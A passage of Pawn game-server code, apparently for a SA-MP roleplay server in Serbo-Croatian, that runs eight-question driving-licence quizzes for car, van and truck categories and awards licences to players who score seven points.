		    if( response )
		    {
		        SetPVarInt( playerid, "dialog_POLAGANJE", 2);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_POLAGANJE", 2);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 2)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_POLAGANJE", 3);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_POLAGANJE", 3);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 3)
	    {
		    if( response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_POLAGANJE", 4);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_POLAGANJE", 4);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 4)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_POLAGANJE", 5);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_POLAGANJE", 5);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 5)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_POLAGANJE", 6);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Preticanje je dozvoljeno sa koje strane?\n\n"col_crvena"A) "col_white"Leve\n"col_crvena"B) "col_white"Desne", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_POLAGANJE", 6);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Preticanje je dozvoljeno sa koje strane?\n\n"col_crvena"A) "col_white"Leve\n"col_crvena"B) "col_white"Desne", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 6)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_POLAGANJE", 7);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Na raskrscu sa semaforima i policajcem , treba slusati?\n\n"col_crvena"A) "col_white"Semafor\n"col_crvena"B) "col_white"Policajac", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_POLAGANJE", 7);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Na raskrscu sa semaforima i policajcem , treba slusati?\n\n"col_crvena"A) "col_white"Semafor\n"col_crvena"B) "col_white"Policajac", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_POLAGANJE") == 7)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_POLAGANJE", 8);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Kada se vozilo krece unazad u desnoj traci:\n\n"col_crvena"A) "col_white"Ne treba ukljuciti sva 4 pokazivaca pravca\n"col_crvena"B) "col_white"Treba ukljuciti sva 4 pokazivaca pravca", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_POLAGANJE", 8);
				SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Kada se vozilo krece unazad u desnoj traci?\n\n"col_crvena"A) "col_white"Ne treba ukljuciti sva 4 pokazivaca pravca\n"col_crvena"B) "col_white"Treba ukljuciti sva 4 pokazivaca pravca", "A", "B");
		    }
		}
	    else if( GetPVarInt( playerid, "dialog_POLAGANJE") == 8 ) {
	    
		    if( response ) {
		    
				if( PolaganjeBodovi[ playerid ]  >= 7 ) {
				
					DeletePVar( playerid, "dialog_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste vozacku dozvolu.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0; PlayerInfo[ playerid ][ xVozacka ] = 1; SavePlayer( playerid );

				}
				else if( PolaganjeBodovi[ playerid ]  < 7 ) {
				
					SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_POLAGANJE");
					Polaganje[ playerid ] = 0;
				}
		    }
		    else if( !response ) {
		    
				PolaganjeBodovi[ playerid ] ++;
				if( PolaganjeBodovi[ playerid ]  >= 7 ) {
				
					DeletePVar( playerid, "dialog_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste vozacku dozvolu.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0; PlayerInfo[ playerid ][ xVozacka ] = 1; SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_A_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_POLAGANJE");
					Polaganje[ playerid ] = 0;
				}
		    }
		}
	}
	else if( dialogid == dialog_K_ISPIT)
	{
	    if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 1)
	    {
		    if( response )
		    {
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 2);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 2);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 2)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 3);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 3);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 3)
	    {
		    if( response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 4);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 4);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 4)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 5);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 5);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 5)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 6);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Ukoliko skrecete lijevo na raskrizju bez semafora vi cete\n\n"col_crvena"A) "col_white"Pustiti automobil iz suprotnog smera da prodje\n"col_crvena"B) "col_white"Skrenuti pre njega", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 6);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Ukoliko skrecete lijevo na raskrizju bez semafora vi cete\n\n"col_crvena"A) "col_white"Pustiti automobil iz suprotnog smera da prodje\n"col_crvena"B) "col_white"Skrenuti pre njega", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 6)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 7);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Ukoliko Vidite prometnu nesrecu sa ozljedenim osobama vi cete\n\n"col_crvena"A) "col_white"Zaustaviti se i pruziti prvu pomoc\n"col_crvena"B) "col_white"Nastaviti voziti", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 7);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Ukoliko Vidite prometnu nesrecu sa ozljedenim osobama vi cete\n\n"col_crvena"A) "col_white"Zaustaviti se i pruziti prvu pomoc\n"col_crvena"B) "col_white"Nastaviti voziti", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_K_POLAGANJE") == 7)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_K_POLAGANJE", 8);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Na raskrizju gde postoji semafor postujete?\n\n"col_crvena"A) "col_white"Pravila saobracaja\n"col_crvena"B) "col_white"Semafor", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_K_POLAGANJE", 8);
				SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Na raskrizju gde postoji semafor postujete?\n\n"col_crvena"A) "col_white"Pravila saobracaja\n"col_crvena"B) "col_white"Semafor", "A", "B");
		    }
		}
	    else if( GetPVarInt( playerid, "dialog_K_POLAGANJE" ) == 8 ) {
	    
		    if( response ) {
		    
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_K_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kombi.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xKamionskaC1 ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_K_POLAGANJE");
				}
		    }
		    else if( !response ) {
		    
				PolaganjeBodovi[ playerid ] ++;
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_K_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kombi.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xKamionskaC1 ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_K_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_K_POLAGANJE");
				}
		    }
		}
	}
	else if( dialogid == dialog_C2_ISPIT )
	{
	    if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 1)
	    {
		    if( response )
		    {
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 2);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 2);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 2)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 3);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 3);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 3)
	    {
		    if( response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 4);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 4);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 4)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 5);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 5);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 5)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 6);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Zabranjeno je da vozilom u saobrac'aju upravlja pod dejstvom alkohola vozac:\n\n"col_crvena"A) "col_white"Motornog vozila bilo koje kategorije \n"col_crvena"B) "col_white"Motornog vozila samo C i D kategorije ", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 6);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Zabranjeno je da vozilom u saobrac'aju upravlja pod dejstvom alkohola vozac:\n\n"col_crvena"A) "col_white"Motornog vozila bilo koje kategorije \n"col_crvena"B) "col_white"Motornog vozila samo C i D kategorije ", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 6)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 7);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Oznaka na vozilu kojom se oznacava da je vozilo upisano u jedinstveni registar vozila je:\n\n"col_crvena"A) "col_white"Registarska tablica \n"col_crvena"B) "col_white"Saobracajna dozvola", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 7);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Oznaka na vozilu kojom se oznacava da je vozilo upisano u jedinstveni registar vozila je:\n\n"col_crvena"A) "col_white"Registarska tablica \n"col_crvena"B) "col_white"Saobracajna dozvola", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 7)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C2_POLAGANJE", 8);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Za vreme upravljanja vozilom, vozac kod sebe:\n\n"col_crvena"A) "col_white"Ne mora imati saobracajnu dozvolu \n"col_crvena"B) "col_white"Mora imati saobracajnu dozvolu", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C2_POLAGANJE", 8);
				SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Za vreme upravljanja vozilom, vozac kod sebe:\n\n"col_crvena"A) "col_white"Ne mora imati saobracajnu dozvolu \n"col_crvena"B) "col_white"Mora imati saobracajnu dozvolu", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_C2_POLAGANJE") == 8)
	    {
		    if( response )
		    {
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_C2_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kamion.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xKamionskaC2 ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_C2_POLAGANJE");
				}
		    }
		    else if( !response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_C2_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kamion.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xKamionskaC2 ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_C2_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_C2_POLAGANJE");
				}
		    }
		}
	}
	else if( dialogid == dialog_C3_ISPIT )
	{
	    if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 1)
	    {
		    if( response )
		    {
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 2);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 2);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 2)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 3);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 3);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 3)
	    {
		    if( response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 4);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 4);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 4)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 5);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 5);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 5)
	    {
		    if( response ) {
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 6);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Zabranjeno je da vozilom u saobrac'aju upravlja pod dejstvom alkohola vozac:\n\n"col_crvena"A) "col_white"Motornog vozila bilo koje kategorije \n"col_crvena"B) "col_white"Motornog vozila samo C i D kategorije ", "A", "B");
		    }
		    else if( !response ) {
		    
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 6);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 6", ""col_crvena"Zabranjeno je da vozilom u saobrac'aju upravlja pod dejstvom alkohola vozac:\n\n"col_crvena"A) "col_white"Motornog vozila bilo koje kategorije \n"col_crvena"B) "col_white"Motornog vozila samo C i D kategorije ", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 6)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 7);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Oznaka na vozilu kojom se oznacava da je vozilo upisano u jedinstveni registar vozila je:\n\n"col_crvena"A) "col_white"Registarska tablica \n"col_crvena"B) "col_white"Saobracajna dozvola", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 7);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 7", ""col_crvena"Oznaka na vozilu kojom se oznacava da je vozilo upisano u jedinstveni registar vozila je:\n\n"col_crvena"A) "col_white"Registarska tablica \n"col_crvena"B) "col_white"Saobracajna dozvola", "A", "B");
		    }
		}
		else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 7)
	    {
		    if( response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_C3_POLAGANJE", 8);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Za vreme upravljanja vozilom, vozac kod sebe:\n\n"col_crvena"A) "col_white"Ne mora imati saobracajnu dozvolu \n"col_crvena"B) "col_white"Mora imati saobracajnu dozvolu", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_C3_POLAGANJE", 8);
				SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Pitanje br. 8", ""col_crvena"Za vreme upravljanja vozilom, vozac kod sebe:\n\n"col_crvena"A) "col_white"Ne mora imati saobracajnu dozvolu \n"col_crvena"B) "col_white"Mora imati saobracajnu dozvolu", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_C3_POLAGANJE") == 8)
	    {
		    if( response )
		    {
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_C3_POLAGANJE");
